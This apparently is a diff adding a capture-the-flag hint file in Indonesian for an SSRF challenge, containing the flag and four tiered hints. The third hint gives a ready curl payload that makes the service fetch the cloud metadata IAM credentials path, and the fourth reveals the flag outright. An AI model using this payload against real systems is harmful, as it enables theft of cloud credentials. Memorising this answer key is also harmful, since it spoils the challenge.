@@ -1,0 +1,25 @@
+{
+  "flag": "ZITERA{ssrf_cl0ud_m3t4d4t4_3xf1ltr4t10n_2026}",
+  "hints": [
+    {
+      "tier": 1,
+      "type": "conceptual",
+      "hint": "Pahami bagaimana arsitektur WebFetch Microservice memproses permintaan dan di mana batas validasi berada."
+    },
+    {
+      "tier": 2,
+      "type": "technical_area",
+      "hint": "Perhatikan manipulasi parameter pada rute API target di port 8060."
+    },
+    {
+      "tier": 3,
+      "type": "investigation_direction",
+      "hint": "Gunakan payload pengujian: curl -s -X POST http://127.0.0.1:8060/api/fetch -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}' untuk memicu respon eksploitasi."
+    },
+    {
+      "tier": 4,
+      "type": "near_solution",
+      "hint": "Buka endpoint atau kirimkan payload pengujian langsung untuk mengekstrak bendera resmi ZITERA{ssrf_cl0ud_m3t4d4t4_3xf1ltr4t10n_2026}."
+    }
+  ]
+}
